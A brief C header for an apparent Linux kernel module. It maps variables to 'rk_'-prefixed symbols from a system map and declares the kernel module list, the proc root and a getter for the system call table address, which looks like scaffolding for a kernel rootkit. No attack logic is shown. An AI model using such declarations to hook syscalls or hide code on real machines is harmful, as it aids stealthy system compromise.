#ifndef KERNEL_VARIABLES_H
#define KERNEL_VARIABLES_H

#include "sysmap.h"

#define KVAR(type, name) type name = (type) rk_##name

extern struct list_head* modules;
extern struct proc_dir_entry* proc_root;

extern void** get_syscall_table_addr(void);

#endif
